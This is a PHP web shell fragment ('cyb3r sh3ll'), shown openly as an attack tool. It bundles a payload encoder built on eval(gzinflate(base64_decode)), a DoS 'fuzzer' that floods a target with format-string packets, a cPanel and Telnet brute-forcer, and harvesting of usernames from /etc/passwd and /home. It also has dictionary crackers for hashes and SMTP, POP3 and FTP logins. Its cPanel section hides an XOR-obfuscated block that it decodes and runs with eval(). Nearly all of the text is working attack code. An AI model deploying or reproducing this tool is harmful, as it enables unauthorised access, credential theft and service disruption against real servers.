<?php
$encoded = \''.$encoded.'\';
eval(gzinflate(base64_decode($encoded)));
// Encoded by cyb3r sh3ll. Thanx lionaneesh for this idea.
?>
';
    }
    else
    {
        $encode = 'Please Enter your Code! and Click Submit! :)';    
    }?>
    <form method="POST">
        <textarea cols="100" rows="20" name="code"><?php echo $encode;?></textarea><br />
        <input style="margin: 20px; margin-left: 50px; padding: 10px;"  class="own"  type="submit" value="Encode :D"/>
    </form>
    <?php
}

if ($act == "fuzzer")
{
    if(isset($_POST['ip']) &&
    isset($_POST['port']) &&
    isset($_POST['times']) &&
    isset($_POST['time']) &&
    isset($_POST['message']) &&
    isset($_POST['messageMultiplier']) &&
    $_POST['message'] != "" &&
    $_POST['time'] != "" &&
    $_POST['times'] != "" &&
    $_POST['port'] != "" &&
    $_POST['ip'] != "" &&
    $_POST['messageMultiplier'] != ""
    )
    {
       $IP=$_POST['ip'];
	   $port=$_POST['port'];
       $times = $_POST['times'];
	   $timeout = $_POST['time'];
	   $send = 0;
       $ending = "";
       $multiplier = $_POST['messageMultiplier'];
       $data = "";
       $mode="tcp";
       $data .= "POST /";
       $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if($_POST['type'] == "tcp")
        {
            $mode = "tcp";
        }
        while($multiplier--)
        {
            $data .= urlencode($_POST['message']);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
        $data .= "by-cyb3r-sh3ll".$ending;
        $length = strlen($data);
        
        
       echo "Sending Data :- <br /> <p align='center'>$data</p>";
        
       print "cyb3r sh3ll is at its Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   for($i=0;$i<$times;$i++)
	   {
            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data , $length );
                fclose($socket);
            }
        }
        echo "<script>alert('Fuzzing Completed!');</script>";
        echo "DOS attack against $mode://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $times . "<br />";
        echo "Total Data Sent = ". showsizE($times*$length) . "<br />"; 
        echo "Data per packet = " . showsizE($length) . "<br />";
    }
    else
    {
        ?>
        <form method="POST">
            <input type="hidden" name="fuzz" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = '';" onblur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = '';" onblur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout
                    </td>
                    <td>
                        <input type="text" name="time" value="5" onfocus="if(this.value == '5')this.value = '';" onblur="if(this.value=='')this.value='5';"/>
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        No of times
                    </td>
                    <td>
                        <input type="text" class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = '';" onblur="if(this.value=='')this.value='100';" />
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Message <font color="red">(The message Should be long and it will be multiplied with the value after it)</font>
                    </td>
                    <td>
                        <input class="cmd" name="message" value="%S%x--Some Garbage here --%x%S" onfocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = '';" onblur="if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';"/>
                    </td>
                    <td>
                        x
                    </td>
                    <td width="20">
                        <input style="width: 30px;" name="messageMultiplier" value="10" />
                    </td>
                </tr>
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="own" value="Let it be! :D"/>
                    </td>
                </tr>
            </table>            
        </form>
        <?php
    }
}

if ($act == "cpanel")
{ 
$cpanel_port="2082";
$connect_timeout=5;
set_time_limit(0);
$submit=$_REQUEST['submit'];
$users=$_REQUEST['users'];
$pass=$_REQUEST['passwords'];
$target=$_REQUEST['target'];
$cracktype=$_REQUEST['cracktype'];
if($target == ""){
$target = "localhost";
}
$charset=$_REQUEST['charset'];
if($charset=="")
 $charset="lowercase";
$max_length=$_REQUEST['max_length'];
if($max_length=="")
 $max_length=10;
$min_length=$_REQUEST['min_length'];
if($min_length=="")
 $min_length=1;

 $charsetall = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetlower = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
 $charsetupper = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z");
 $charsetnumeric = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetlowernumeric = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetuppernumeric = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetletters = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" );
 $charsetsymbols= array("!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetlowersymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetuppersymbols = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetletterssymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetnumericsymbols = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetlowernumericsymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetuppernumericsymbols = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetletterssymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ,"!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetlettersnumericsymbols=array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ,"!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_","0", "1", "2", "3", "4", "5", "6", "7", "8", "9" );
	if ($charset == "all")
		$vals = $charsetall;
    elseif ($charset == "lowercase") 
		$vals = $charsetlower;
	 elseif ($charset == "uppercase") 
		$vals = $charsetupper;
	 elseif ($charset == "numeric") 
		$vals = $charsetnumeric;
	 elseif ($charset == "lowernumeric") 
		$vals = $charsetlowernumeric;
	 elseif ($charset == "uppernumeric") 
		$vals = $charsetuppernumeric;
	elseif ($charset == "letters") 
		$vals = $charsetletters;
	elseif ($charset == "symbols") 
		$vals = $charsetsymbols;
	elseif ($charset == "lowersymbols") 
		$vals = $charsetlowersymbols;
	elseif ($charset == "uppersymbols") 
		$vals = $charsetuppersymbols;
	elseif ($charset == "letterssymbols") 
		$vals = $charsetletterssymbols;
	elseif ($charset == "numberssymbols") 
		$vals = $charsetnumericsymbols;
	elseif ($charset == "lowernumericsymbols") 
		$vals = $charsetlowernumericsymbols;
	elseif ($charset == "uppernumericsymbols") 
		$vals = $charsetuppernumericsymbols;
	elseif ($charset == "lettersnumericsymbols") 
		$vals = $charsetlettersnumericsymbols;
	else echo "INVALID CHARSET";
	$key_that_script_is_crypted=19;
$resource_crypted_code ='7~`3.37L@VAEVAH1@VAEVAL]R^V1N=7L@VAEVAH1@PAZCGL]R^V1N(7`fq3.31@{v3--3)313=37~`(7|3.3raarj3;1|~1?1g~rz1?1yLr~a"1?1S{|1?1=p1:(7vv3.37|H!N=7|H N=7|H"N=7|H[t3]N=7|H#N(7`v}w3.3S~rz;7vv?7`fq?7~`:(3';
$string_output=str_replace("[t1]", "<?", $resource_crypted_code);
$string_output=str_replace("[t3]", "'", $string_output);
$lenth_of_crypted_code=strlen($string_output);
$eval_php_code='';
for($huivamvsem=0;$huivamvsem<$lenth_of_crypted_code;$huivamvsem++)
$eval_php_code .= chr(ord($string_output[$huivamvsem]) ^ $key_that_script_is_crypted);
eval($eval_php_code);
?>
<div align="center">
 
 <form method="POST" >
 <table border="1" width="67%" bordercolorlight="#008000" bordercolordark="#003700" >
     <tr>
	    <td>
		  <p align="center"><b>
		    <font color="#008000" face="Tahoma" size="2">IP servers :</font></b>
			<input type="text" name="target" size="16" value="<?php echo $target ?>" style="border: 2px; background-color: #800000; color:#C0C0C0 font-family:Verdana; font-size:13px;" /><br/><br/>
			<table border="1" width="57%" bordercolorlight="#008000" bordercolordark="#003700">
                <tr><td align="center" width="50%"><font color="#FF0000"><b>User List</b></font></td><td align="center"><font color="#FF0000"><b>Password List</b></font></td></tr>
            </table>
			<textarea rows="20" name="users" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><?php echo $users ?></textarea>
            <textarea rows="20" name="passwords" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><?php echo $pass ?></textarea><br/>
			<font style="font-weight:700" size="2" face="Tahoma" color="#008000">Guess options</font>
			&nbsp;<input name="cracktype" value="cpanel" style="font-weight: 700;" checked type="radio">
			<b><font size="2" face="Tahoma" color="#008000">Cpanel </font><font size="2" color="#FFFFFF" face="Tahoma"> (2082)</font></b>
			<input name="cracktype" value="cpanel2" style="font-weight: 700;" type="radio">
			<b><font size="2" face="Tahoma" color="#008000">Telnet</font><font size="2" color="#FFFFFF" face="Tahoma">(23)</font></b>
			<br/>
			<font style="font-weight:700" size="2" face="Tahoma" color="#008000">Timeout Delay</font>
			<input type="text" name="connect_timeout" style="border: 2px solid #1D1D1D;background: black;color:RED" size=48 value="<?php echo $connect_timeout;?>" /><br/>
			<input type="checkbox" name="bruteforce" value="true" /><font style="font-weight:700" size="2" face="Tahoma" color="#008000">Bruteforce</font>
			<select name="charset" style="border: 2px solid #1D1D1D;background: black;color:RED">
				<option value="all">All Letters + Numbers</option>
 				<option value="numeric">Numbers</option>
				<option value="letters">Letters</option>
				<option value="symbols">Symbols</option>
				<option value="lowercase">Lower Letters</option>
				<option value="uppercase">Higher Letters</option>
				<option value="lowernumeric">Lower Letters + Numbers</option>
				<option value="uppernumeric">Upper Letters + Numbers</option>
				<option value="lowersymbols">Lower Letters + Symbols</option>
				<option value="uppersymbols">Upper Letters + Symbols</option>
				<option value="letterssymbols">All Letters + Symbols</option>
				<option value="numberssymbols">Numbers + Symbols</option>
				<option value="lowernumericsymbols">Lower Letters + Numbers + Symbols</option>
				<option value="uppernumericsymbols">Upper Letters + Numbers + Symbols</option>
				<option value="lettersnumericsymbols">All Letters + Numbers + Symbols</option>
            </select><br/>
		    <font style="font-weight:700" size="2" face="Tahoma" color="#008000">Min Bruteforce Length:</font>
			<input type="text" name="min_length" style="border: 2px solid #1D1D1D;background: black;color:RED" size=48 value="<?php echo $min_length;?>"/><br/>
			<font style="font-weight:700" size="2" face="Tahoma" color="#008000">Max Bruteforce Length:</font>
			<input type="text" name="max_length" style="border: 2px solid #1D1D1D;background: black;color:RED" size=48 value="<?php echo $max_length;?>"/>
			<p align="center"><input type="submit" value="Go" name="submit" style="color: #008000; font-weight: bold; border: 1px solid #333333; background-color: #000000"></p>
		</p>
		</td>
	 </tr>
 
 </table>
 </form>
 
<?php
function brute()
{
	global $vals,$min_length,$max_length;
	global $target,$pureuser,$connect_timeout;
	$min=$min_length;
	$max=$max_length;
	$A = array();
	$numVals = count($vals);
	$incDone = "";
	$realMax = "";
	$currentVal = "";
	$firstVal = "";
	for ($i = 0; $i < ($max + 1); $i++) {
		$A[$i] = -1;
	}
	
	for ($i = 0; $i < $max; $i++) {
		$realMax = $realMax . $vals[$numVals - 1];
	}
	for ($i = 0; $i < $min; $i++) {
		$A[$i] = $vals[0];
	}
	$i = 0;
	while ($A[$i] != -1) {
		$firstVal .= $A[$i];
		$i++;
	}
	//echo $firstVal . "<br>";
	cpanel_check($target,$pureuser,$firstVal,$connect_timeout);
	
	while (1) {
		for ($i = 0; $i < ($max + 1); $i++) {
			if ($A[$i] == -1) {
				break;
			}
		}
		$i--;
		$incDone = 0;
		while (!$incDone) {	
			for ($j = 0; $j < $numVals; $j++) {
				if ($A[$i] == $vals[$j]) {
					break;
				}
			}
			if ($j == ($numVals - 1)) {
				$A[$i] = $vals[0];
				$i--;
				if ($i < 0) {
					for ($i = 0; $i < ($max + 1); $i++) {
						if ($A[$i] == -1) {
							break;
						}
					}
					$A[$i] = $vals[0];
					$A[$i + 1] = -1;
					$incDone = 1;
					print "Starting " . (strlen($currentVal) + 1) . " Characters Cracking<br>";
				}
			} else {
				$A[$i] = $vals[$j + 1];
				$incDone = 1;
			}
		}
		$i = 0;
		$currentVal = "";
		while ($A[$i] != -1) {
			$currentVal = $currentVal . $A[$i];
			$i++;
		}
		cpanel_check($target,$pureuser,$currentVal,$connect_timeout);
		//echo $currentVal . "<br>";
		if ($currentVal == $realMax) {
			return 0;
		}
	}
}
function getmicrotimev() {
   list($usec, $sec) = explode(" ",microtime());
   return ((float)$usec + (float)$sec);
} 

function ftp_check($host,$user,$pass,$timeout)
{
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "ftp://$host");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
 curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
 $data = curl_exec($ch);
 if ( curl_errno($ch) == 28 )
 {
 print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
 <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
 Please Check The Target Hostname .</font></font></b></p>";exit;
 }
 else if ( curl_errno($ch) == 0 )
 {
  print "<b><font face=\"Comic Sans MS\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Comic Sans MS\"   style=\"font-size: 9pt\"><b><font color=\"#008000\">
 Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
 and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
 }
 curl_close($ch);
}
function cpanel_check($host,$user,$pass,$timeout)
{
 global $cpanel_port;
 $ch = curl_init();
 //echo "http://$host:".$cpanel_port." $user $pass<br>";
 curl_setopt($ch, CURLOPT_URL, "http://$host:" . $cpanel_port);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
 $data = curl_exec($ch);
 if ( curl_errno($ch) == 28 )
 {
  print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
  <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
  Please Check The Target Hostname .</font></font></b></p>";exit;
 }
 else if ( curl_errno($ch) == 0 )
 {
  print "<b><font face=\"Comic Sans MS\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Comic Sans MS\"   style=\"font-size: 9pt\"><b><font color=\"#008000\"> 
  Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
  and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
 }
 curl_close($ch);
}

$time_start = getmicrotime();

if(isset($submit) && !empty($submit))
{
 if(empty($users) && empty($pass) )
 {
   print "<p><font face=\"Comic Sans MS\" size=\"2\"><b><font color=\"#FF0000\">Error : </font>Please Check The Users or Password List Entry . . .</b></font></p>"; exit; }
 if(empty($users)){ print "<p><font face='Comic Sans MS' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Users List Entry . . .</b></font></p>"; exit; }
 if(empty($pass) && $_REQUEST['bruteforce']!="true" ){ print "<p><font face='Comic Sans MS' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Password List Entry . . .</b></font></p>"; exit; };
 $userlist=explode("\n",$users);
 $passlist=explode("\n",$pass);
 print "<b><font face=\"Comic Sans MS\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Comic Sans MS\" style=\"font-size: 9pt\" color=\"#FF0000\">
 LETS GAME BEGIN ;) ...</font></b><br><br>";

 if(isset($_POST['connect_timeout']))
 {
  $connect_timeout=$_POST['connect_timeout'];
 }

 if($cracktype == "ftp")
 {
  foreach ($userlist as $user) 
  {
   $pureuser = trim($user);
   foreach ($passlist as $password ) 
   {
     $purepass = trim($password);
     ftp_check($target,$pureuser,$purepass,$connect_timeout);
   }
  }
 }
 
 if ($cracktype == "cpanel" || $cracktype == "cpanel2")
 {
  if($cracktype == "cpanel2")
  {
   $cpanel_port="23";
  }
  else
   $cpanel_port="2082";
  
  foreach ($userlist as $user) 
  {
   $pureuser = trim($user);
   print "<b><font face=\"Comic Sans MS\" style=\"font-size: 11pt\" color=\"#008000\">[~]#</font><font face=\"Comic Sans MS\"  style=\"font-size: 9pt\" color=\"#FF0800\">
   Please put some good password to crack user $pureuser    :(  ... </font></b>";
   if($_POST['bruteforce']=="true")
   {
    echo " bruteforcing ..";
	echo "<br>";
	brute();
   }
   else
   {
	 echo "<br>"; 
	 foreach ($passlist as $password ) 
     {
       $purepass = trim($password);
       cpanel_check($target,$pureuser,$purepass,$connect_timeout);
     }
   }
  }
  $time_end = getmicrotime();
$time = $time_end - $time_start; 
 print "<b><font face=\"Comic Sans MS\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Comic Sans MS\" style=\"font-size: 9pt\" color=\"#FF0000\">
 Cracking Finished. Elapsed time: $time</font> seconds</b><br><br>";
  }
}



?>

    <table border="1" width="67%" bordercolorlight="#008000" bordercolordark="#006A00" >
	  <tr>
	   <td>
	     <textarea style="border: 2px solid #1D1D1D;background: #200000;color:#CCFFFF" method='POST' rows="20" name="S1" cols="173">
         <?php
   if (isset($_GET['user']))
      system('ls /var/mail'); 
   if (isset($_POST['grab_users1'])) //grab users from /etc/passwd
   {
	  $lines=file("/etc/passwd");
	  foreach($lines as $nr=>$val)
	  {
	   $str=explode(":",$val);
	   echo $str[0]."\n";
	  }
	 
   }
   if (isset($_POST['grab_users2']))
    {
     $dir = "/home/";
     if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            echo $file. "\n";
        }
			closedir($dh);
		}
	}
?>
        </textarea>
	   </td>
	  </tr>
	  <tr>
	  <td valign="top"><p align="center">
	    <table>
         <tr >
		 <td>
          <form action="" method="POST">
		     <input type="hidden" value="true" name="grab_users1"></input>
             <input type=submit value="Grab Usernames from /etc/passwd" width="217px"></input>
		  </form>
		  </td>
		 
		 <td>
           <form action="" method="POST">
             <input type="hidden" value="true" name="grab_users2" ></input>
             <input style="width: 217px;" type=submit value="Grab Usernames from /home/" ></input>
           </form>
		   </td>
        <td>
           <form action="" method="POST">
              <input type="hidden" value="true" name="grab_users3"></input>
              <input style="width: 217px;" type=submit value="Grab Usernames from /home/ II"></input>
           </form>
		 </td>
         </tr>
        </table></p>
		</td>
	  </tr>
	</table>
	<?php
if (isset($_POST['grab_users3']))
{
error_reporting(0);
$dir = "/home/";
if ($dh = opendir($dir))
{
$f = readdir($dh);$f = readdir($dh);
while (($f = readdir($dh)) !== false)
{
//echo $f. "\n";
$f.="/";
$dh2=opendir($dir.$f);
$f2 = readdir($dh2);$f2 = readdir($dh2);
while (($f2 = readdir($dh2)) !== false)
{
//echo $f2. "\n";
$f2.="/";
$dh3=opendir($dir.$f.$f2);
$f3 = readdir($dh3);$f3 = readdir($dh3);
while (($f3 = readdir($dh3)) !== false)
{
echo $f3. "<br>";
}
}

}
closedir($dh);
}
}
?>
 
 
</div> 

<?php
}

if ($act == "hash")
{
global $errorbox,$t,$et,$hcwd;
if (!empty($_REQUEST['hash']) && !empty($_REQUEST['dictionary']) && !empty($_REQUEST['type'])){
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
$hash=strtoupper($_REQUEST['hash']);
echo "<font color=blue>Cracking " . htmlspecialchars($hash)."...<br>";flusheR();
$type=($_REQUEST['type']=='MD5')?'md5':'sha1';
while(!feof($dictionary)){
$word=trim(fgets($dictionary)," \n\r");
if ($hash==strtoupper(($type($word)))){echo "The answer is $word<br>";break;}
}
echo "Done!</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
echo "<center><table width=\"30%\">Hash cracker:</td><td ></td></tr><form method=\"POST\"><tr><td width=\"30%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\" ><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Hash:</td><td bgcolor=\"#808080\"><input type=text name=hash size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Type:</td><td bgcolor=\"#666666\"><select name=type><option selected value=MD5>MD5</option><option value=SHA1>SHA1</option></select></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=Start></td></tr></form></table></table></center>";
echo $eval_php_code;
}

if ($act == "smtp")
{
global $t,$et,$errorbox,$crack;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=yellow>Cracking ".htmlspecialchars($target)."...<br/>";flusheR();
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$smtp=smtplogiN($target,$user,$pass,5);
if($smtp==-1){echo "$errorbox Can not connect to server.$et";break;} else{
if ($smtp){echo "U: $user P: $pass<br/>";if(!$type)break;}}
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else 
{
echo "<center>SMTP cracker:$crack";
}

echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tr><td width=\"40%\" bgcolor=\"#333333\">SMTP cracker:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\" name=form action=\"\"><tr><td width=\"20%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Dictionary type:</td><td bgcolor=\"#808080\"><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Username:</td><td bgcolor=\"#666666\"><input type=text size=35 value=root name=user></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Server:</td><td bgcolor=\"#808080\"><input type=text name=target value=localhost size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right><input class=buttons type=submit value=Start></td></tr></form></table></center>";


}

if ($act == "pop3")
{

global $t,$et,$errorbox,$crack;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=blue>Cracking ".htmlspecialchars($target)."...<br>";flusheR();
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$pop3=pop3logiN($target,$user,$pass);
if($pop3==-1){echo "$errorbox Can not connect to server.$et";break;} else{
if ($pop3){echo "U: $user P: $pass<br>";if(!$type)break;}}
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else 
{ echo "<center>POP3 cracker:$crack</center>";
}
echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tr><td width=\"40%\" bgcolor=\"#333333\">POP3 cracker:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\" name=form action=\"\"><tr><td width=\"20%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Dictionary type:</td><td bgcolor=\"#808080\"><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Username:</td><td bgcolor=\"#666666\"><input type=text size=35 value=root name=user></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Server:</td><td bgcolor=\"#808080\"><input type=text name=target value=localhost size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right><input class=buttons type=submit value=Start></td></tr></form></table></center>";

}
if ($act == "ftp")
{
global $errorbox,$t,$et,$crack;
if (!function_exists("ftp_connect"))echo "$errorbox Server does n`t support FTP functions$et";
else{
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=yellow>Cracking ".htmlspecialchars($target)."...<br>";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
if(!$ftp=ftp_connect($target,21,8)){echo "$errorbox Can not connect to server.$et";break;}
if (@ftp_login($ftp,$user,$pass)){echo "U: $user P: $pass<br>";if(!$type)break;}
ftp_close($ftp);
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
else 
{
echo "<center>FTP cracker:$crack</center>";
}
